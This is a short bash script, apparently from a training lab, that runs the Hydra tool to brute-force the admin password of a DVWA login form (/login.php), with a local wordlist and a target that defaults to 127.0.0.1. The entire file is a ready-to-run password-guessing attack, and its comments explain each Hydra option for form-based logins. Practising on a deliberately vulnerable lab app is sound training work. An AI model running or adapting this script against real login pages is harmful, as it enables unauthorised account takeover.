#!/usr/bin/env bash
#
# Play 02 – Hydra DVWA
# Uso: ./run.sh [HOST[:PORT]]
# Exemplo: ./run.sh 127.0.0.1:8081

# Vai para o diretório deste script
cd "$(dirname "$0")"

# IP e porta recebidos ou default para 127.0.0.1:80
TARGET=${1:-127.0.0.1:80}

echo "[*] Iniciando ataque com Hydra contra $TARGET..."
sleep 1

# Hydra usando http-form-post:
#   -l admin           → usuário fixo "admin"
#   -P passwords.txt   → wordlist local
#   -s PORT            → porta, caso exista (:PORT no TARGET)
#   http-form-post     → módulo correto para login via formulário
#   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
#                      → PATH, POST data, string de falha
hydra -l admin \
      -P passwords.txt \
      -s ${TARGET#*:} \
      ${TARGET%%:*} http-form-post \
      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
      -t 4 -V > resultado.txt

echo
echo "[📄] Saída do Hydra:"
cat resultado.txt
echo
echo "[✔️] Teste concluído com sucesso."
